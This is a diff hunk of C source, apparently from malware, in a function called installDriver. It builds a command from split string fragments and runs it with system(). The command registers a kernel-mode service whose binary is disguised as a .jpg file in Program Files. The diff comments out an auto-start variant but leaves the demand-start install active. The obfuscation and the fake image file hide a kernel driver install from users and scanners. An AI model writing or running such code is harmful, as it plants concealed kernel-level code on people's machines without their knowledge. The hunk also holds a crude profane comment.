@@ -44,9 +44,9 @@ void installDriver() {
     char xs[120];
     //printf("Just a fucking string\n");
     sprintf(xs, "s%stype= ke%ssta%sb%s\\Program Files\\lolita.%s", "c create kimg ", "rnel ", "rt= demand ", "inPath= \"C:", "jpg\"");
-    if (PRODUCT_MODE) {
-        sprintf(xs, "s%stype= ke%ssta%sb%s\\Program Files\\lolita.%s", "c create kimg ", "rnel ", "rt= auto ", "inPath= \"C:", "jpg\"");
-    }
+    //if (PRODUCT_MODE) {
+    //    sprintf(xs, "s%stype= ke%ssta%sb%s\\Program Files\\lolita.%s", "c create kimg ", "rnel ", "rt= auto ", "inPath= \"C:", "jpg\"");
+    //}
     printf("%s\n", xs);
     system(xs);
     
